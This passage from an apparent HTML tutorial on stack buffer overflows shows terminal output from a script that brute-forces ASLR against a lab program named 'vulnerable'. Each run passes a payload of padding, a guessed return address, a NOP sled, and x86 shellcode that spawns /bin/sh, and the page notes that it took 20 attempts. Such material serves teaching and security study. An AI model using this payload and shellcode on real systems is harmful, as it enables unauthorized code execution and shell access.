+./brute_force.sh: line 11: 16277 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+4 sp bfcbc9e0
+
+./brute_force.sh: line 11: 16285 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+5 sp bfd794d0
+
+./brute_force.sh: line 11: 16293 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+6 sp bfaa49c0
+
+./brute_force.sh: line 11: 16301 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+7 sp bfac9870
+
+./brute_force.sh: line 11: 16309 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+8 sp bfa30420
+
+./brute_force.sh: line 11: 16317 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+9 sp bfd87030
+
+./brute_force.sh: line 11: 16325 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+10 sp bfa4cc00
+
+./brute_force.sh: line 11: 16333 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+11 sp bfddb220
+
+./brute_force.sh: line 11: 16341 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+12 sp bfddb220
+
+./brute_force.sh: line 11: 16349 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+13 sp bfddb220
+
+./brute_force.sh: line 11: 16357 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+14 sp bfddb220
+
+./brute_force.sh: line 11: 16365 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+15 sp bfddb220
+
+./brute_force.sh: line 11: 16373 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+16 sp bfddb220
+
+./brute_force.sh: line 11: 16382 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+17 sp bfddb220
+
+./brute_force.sh: line 11: 16390 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+18 sp bfddb220
+
+./brute_force.sh: line 11: 16398 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+19 sp bfddb220
+
+./brute_force.sh: line 11: 16406 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+20 sp bfddb220
+
+$
+</pre>
+<p>
+This time it took 20 attempts to get it &#x2026; the next time, maybe more,
+maybe less. But the odds are ever in our favor :)
+</p>
+</div>
+</div>
+</div>
+</body>
+</html>
